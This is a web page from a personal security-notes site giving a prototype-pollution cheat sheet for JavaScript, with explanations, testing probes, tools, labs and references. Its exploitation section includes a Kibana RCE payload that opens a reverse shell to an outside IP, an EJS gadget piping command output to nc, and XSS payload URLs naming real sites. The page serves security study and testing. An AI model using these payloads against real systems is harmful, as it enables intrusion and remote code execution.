<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Prototype pollution | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="/assets/img/logos/m1N147z1.png?c5fa12f00bf81b0bfdfb738a6722b18c"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/docs/hacking/Prototype-Pollution/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">\ h0m3 / </a> </li> <li class="nav-item active"> <a class="nav-link" href="/docs/">/ d0Cs \ <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">\ bl0g / </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">/ m0Re \ </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/repos/">repositories</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/cv/">Cv</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> <div class="dropdown-divider"></div> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"><div class="post"> <header class="post-header"> <h1 class="post-title">Prototype pollution</h1> <p class="post-description"></p> </header> <article> <blockquote> <p>Prototype pollution is a type of vulnerability that occurs in JavaScript when properties of Object. Prototype are modified. This is particularly risky because JavaScript objects are dynamic and we can add properties to them at any time. Also, almost all objects in JavaScript inherit from Object.prototype, making it a potential attack vector.</p> </blockquote> <h2 id="summary">Summary</h2> <ul> <li><a href="#tools">Tools</a></li> <li><a href="#methodology">Methodology</a> <ul> <li><a href="#examples">Examples</a></li> <li><a href="#manual-testing">Manual Testing</a></li> <li><a href="#prototype-pollution-via-json-input">Prototype Pollution via JSON Input</a></li> <li><a href="#prototype-pollution-in-url">Prototype Pollution in URL</a></li> <li><a href="#prototype-pollution-payloads">Prototype Pollution Payloads</a></li> <li><a href="#prototype-pollution-gadgets">Prototype Pollution Gadgets</a></li> </ul> </li> <li><a href="#labs">Labs</a></li> <li><a href="#references">References</a></li> </ul> <h2 id="tools">Tools</h2> <ul> <li><a href="https://github.com/yeswehack/pp-finder">yeswehack/pp-finder</a> - Help you find gadget for prototype pollution exploitation</li> <li><a href="https://github.com/yuske/silent-spring">yuske/silent-spring</a> - Prototype Pollution Leads to Remote Code Execution in Node.js</li> <li><a href="https://github.com/yuske/server-side-prototype-pollution">yuske/server-side-prototype-pollution</a> - Server-Side Prototype Pollution gadgets in Node.js core code and 3rd party NPM packages</li> <li><a href="https://github.com/BlackFan/client-side-prototype-pollution">BlackFan/client-side-prototype-pollution</a> - Prototype Pollution and useful Script Gadgets</li> <li><a href="https://github.com/portswigger/server-side-prototype-pollution">portswigger/server-side-prototype-pollution</a> - Burp Suite Extension detectiong Prototype Pollution vulnerabilities</li> <li><a href="https://github.com/msrkp/PPScan">msrkp/PPScan</a> - Client Side Prototype Pollution Scanner</li> </ul> <h2 id="methodology">Methodology</h2> <p>In JavaScript, prototypes are what allow objects to inherit features from other objects. If an attacker is able to add or modify properties of <code class="language-plaintext highlighter-rouge">Object.prototype</code>, they can essentially affect all objects that inherit from that prototype, potentially leading to various kinds of security risks.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">myDog</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Dog</span><span class="p">();</span>
</code></pre></div></div> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Points to the function "Dog"</span>
<span class="nx">myDog</span><span class="p">.</span><span class="kd">constructor</span><span class="p">;</span>
</code></pre></div></div> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Points to the class definition of "Dog"</span>
<span class="nx">myDog</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">;</span>
<span class="nx">myDog</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">;</span>
<span class="nx">myDog</span><span class="p">[</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">];</span>
</code></pre></div></div> <p><br/></p> <h3 id="examples">Examples</h3> <ul> <li>Imagine that an application uses an object to maintain configuration settings, like this: <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">config</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">isAdmin</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></div> </div> </li> <li>An attacker might be able to add an <code class="language-plaintext highlighter-rouge">isAdmin</code> property to <code class="language-plaintext highlighter-rouge">Object.prototype</code>, like this: <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">isAdmin</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</code></pre></div> </div> </li> </ul> <p><br/></p> <h3 id="manual-testing">Manual Testing</h3> <ul> <li>ExpressJS: <code class="language-plaintext highlighter-rouge">{ "__proto__":{"parameterLimit":1}}</code> + 2 parameters in GET request, at least 1 must be reflected in the response.</li> <li>ExpressJS: <code class="language-plaintext highlighter-rouge">{ "__proto__":{"ignoreQueryPrefix":true}}</code> + <code class="language-plaintext highlighter-rouge">??foo=bar</code></li> <li>ExpressJS: <code class="language-plaintext highlighter-rouge">{ "__proto__":{"allowDots":true}}</code> + <code class="language-plaintext highlighter-rouge">?foo.bar=baz</code></li> <li>Change the padding of a JSON response: <code class="language-plaintext highlighter-rouge">{ "__proto__":{"json spaces":" "}}</code> + <code class="language-plaintext highlighter-rouge">{"foo":"bar"}</code>, the server should return <code class="language-plaintext highlighter-rouge">{"foo": "bar"}</code></li> <li>Modify CORS header responses: <code class="language-plaintext highlighter-rouge">{ "__proto__":{"exposedHeaders":["foo"]}}</code>, the server should return the header <code class="language-plaintext highlighter-rouge">Access-Control-Expose-Headers</code>.</li> <li>Change the status code: <code class="language-plaintext highlighter-rouge">{ "__proto__":{"status":510}}</code></li> </ul> <p><br/></p> <h3 id="prototype-pollution-via-json-input">Prototype Pollution via JSON Input</h3> <p>You can access the prototype of any object via the magic property <code class="language-plaintext highlighter-rouge">__proto__</code>. The <code class="language-plaintext highlighter-rouge">JSON.parse()</code> function in JavaScript is used to parse a JSON string and convert it into a JavaScript object. Typically it is a sink function where prototype pollution can happen.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
    <span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
        <span class="dl">"</span><span class="s2">evilProperty</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">evilPayload</span><span class="dl">"</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <p>Asynchronous payload for NodeJS.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
  <span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">argv0</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">node</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">shell</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">node</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">NODE_OPTIONS</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">--inspect=payload</span><span class="se">\"\"</span><span class="s2">.oastify</span><span class="se">\"\"</span><span class="s2">.com</span><span class="dl">"</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <p>Polluting the prototype via the <code class="language-plaintext highlighter-rouge">constructor</code> property instead.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
    <span class="dl">"</span><span class="s2">constructor</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
        <span class="dl">"</span><span class="s2">prototype</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">foo</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">bar</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">json spaces</span><span class="dl">"</span><span class="p">:</span> <span class="mi">10</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <p><br/></p> <h3 id="prototype-pollution-in-url">Prototype Pollution in URL</h3> <p>Example of Prototype Pollution payloads found in the wild.</p> <pre><code class="language-ps1">https://victim.com/#a=b&amp;__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&amp;__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&amp;a[constructor][prototype][onerror]=alert(1)
</code></pre> <p><br/></p> <h3 id="prototype-pollution-exploitation">Prototype Pollution Exploitation</h3> <p>Depending if the prototype pollution is executed client (CSPP) or server side (SSPP), the impact will vary.</p> <ul> <li>Remote Command Execution: <a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">RCE in Kibana (CVE-2019-7609)</a> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nf">es</span><span class="p">(</span><span class="o">*</span><span class="p">).</span><span class="nf">props</span><span class="p">(</span><span class="nx">label</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">AAAA</span><span class="o">=</span><span class="dl">'</span><span class="s1">require("child_process").exec("bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1");process.exit()//</span><span class="dl">'</span><span class="p">)</span>
<span class="p">.</span><span class="nf">props</span><span class="p">(</span><span class="nx">label</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span><span class="o">=</span><span class="dl">'</span><span class="s1">--require /proc/self/environ</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div> </div> </li> <li>Remote Command Execution: <a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce">RCE using EJS gadgets</a> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
    <span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
        <span class="dl">"</span><span class="s2">client</span><span class="dl">"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">escapeFunction</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')</span><span class="dl">"</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div> </div> </li> <li>Reflected XSS: <a href="https://hackerone.com/reports/986386">Reflected XSS on www.hackerone.com via Wistia embed code - #986386</a></li> <li>Client-side bypass: <a href="https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/">Prototype pollution – and bypassing client-side HTML sanitizers</a></li> <li>Denial of Service</li> </ul> <p><br/></p> <h3 id="prototype-pollution-payloads">Prototype Pollution Payloads</h3> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">[</span><span class="dl">"</span><span class="s2">evilProperty</span><span class="dl">"</span><span class="p">]</span><span class="o">=</span><span class="dl">"</span><span class="s2">evilPayload</span><span class="dl">"</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">evilProperty</span><span class="o">=</span><span class="dl">"</span><span class="s2">evilPayload</span><span class="dl">"</span>
<span class="nb">Object</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">evilProperty</span><span class="o">=</span><span class="dl">"</span><span class="s2">evilPayload</span><span class="dl">"</span>
<span class="nb">Object</span><span class="p">.</span><span class="kd">constructor</span><span class="p">[</span><span class="dl">"</span><span class="s2">prototype</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">evilProperty</span><span class="dl">"</span><span class="p">]</span><span class="o">=</span><span class="dl">"</span><span class="s2">evilPayload</span><span class="dl">"</span>
<span class="p">{</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">evilProperty</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">evilPayload</span><span class="dl">"</span><span class="p">}}</span>
<span class="p">{</span><span class="dl">"</span><span class="s2">__proto__.name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">}</span>
<span class="nx">x</span><span class="p">[</span><span class="nx">__proto__</span><span class="p">][</span><span class="nx">abaeead</span><span class="p">]</span> <span class="o">=</span> <span class="nx">abaeead</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">edcbcab</span> <span class="o">=</span> <span class="nx">edcbcab</span>
<span class="nx">__proto__</span><span class="p">[</span><span class="nx">eedffcb</span><span class="p">]</span> <span class="o">=</span> <span class="nx">eedffcb</span>
<span class="nx">__proto__</span><span class="p">.</span><span class="nx">baaebfc</span> <span class="o">=</span> <span class="nx">baaebfc</span>
<span class="p">?</span><span class="nx">__proto__</span><span class="p">[</span><span class="nx">test</span><span class="p">]</span><span class="o">=</span><span class="nx">test</span>
</code></pre></div></div> <p><br/></p> <h3 id="prototype-pollution-gadgets">Prototype Pollution Gadgets</h3> <p>A “gadget” in the context of vulnerabilities typically refers to a piece of code or functionality that can be exploited or leveraged during an attack. When we talk about a “prototype pollution gadget,” we’re referring to a specific code path, function, or feature of an application that is susceptible to or can be exploited through a prototype pollution attack.</p> <p>Either create your own gadget using part of the source with <a href="https://github.com/yeswehack/pp-finder">yeswehack/pp-finder</a>, or try to use already discovered gadgets <a href="https://github.com/yuske/server-side-prototype-pollution">yuske/server-side-prototype-pollution</a> / <a href="https://github.com/BlackFan/client-side-prototype-pollution">BlackFan/client-side-prototype-pollution</a>.</p> <h2 id="labs">Labs</h2> <ul> <li><a href="https://dojo-yeswehack.com/XSS/Training/Prototype-Pollution">YesWeHack Dojo - Prototype Pollution</a></li> <li><a href="https://portswigger.net/web-security/all-labs#prototype-pollution">PortSwigger - Prototype Pollution</a></li> </ul> <h2 id="references">References</h2> <ul> <li><a href="https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks">A Pentester’s Guide to Prototype Pollution Attacks - Harsh Bothra - January 2, 2023</a></li> <li><a href="https://blog.s1r1us.ninja/research/PP">A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild - s1r1us - September 28, 2021</a></li> <li><a href="https://www.intruder.io/research/server-side-prototype-pollution">Detecting Server-Side Prototype Pollution - Daniel Thatcher - February 15, 2023</a></li> <li><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609) - Michał Bentkowski - October 30, 2019</a></li> <li><a href="https://youtu.be/LD-KcuKM_0M">Server Side Prototype Pollution: Blackbox Detection Without The DoS - Gareth Heyes - March 27, 2023</a></li> <li><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution">NodeJS - __proto__ &amp; prototype Pollution - HackTricks - July 19, 2024</a></li> <li><a href="https://portswigger.net/web-security/prototype-pollution">Prototype Pollution - PortSwigger - November 10, 2022</a></li> <li><a href="https://learn.snyk.io/lessons/prototype-pollution/javascript/">Prototype pollution - Snyk - August 19, 2023</a></li> <li><a href="https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/">Prototype pollution and bypassing client-side HTML sanitizers - Michał Bentkowski - August 18, 2020</a></li> <li><a href="https://youtu.be/mwpH9DF_RDA">Prototype Pollution and Where to Find Them - BitK &amp; SakiiR - August 14, 2023</a></li> <li><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Prototype Pollution Attacks in NodeJS - Olivier Arteau - May 16, 2018</a></li> <li><a href="https://youtu.be/LUsiFV3dsK8">Prototype Pollution Attacks in NodeJS applications - Olivier Arteau - October 3, 2018</a></li> <li><a href="https://youtu.be/v5dq80S1WF4">Prototype Pollution Leads to RCE: Gadgets Everywhere - Mikhail Shcherbakov - September 29, 2023</a></li> <li><a href="http://web.archive.org/web/20230218081534/https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/">Server side prototype pollution, how to detect and exploit - BitK - February 18, 2023</a></li> <li><a href="https://portswigger.net/research/server-side-prototype-pollution">Server-side prototype pollution: Black-box detection without the DoS - Gareth Heyes - February 15, 2023</a></li> </ul> </article> </div> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> -[47z!Lu7h] -[Love is life. And if you miss love, you miss life. ]-[2025]- </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>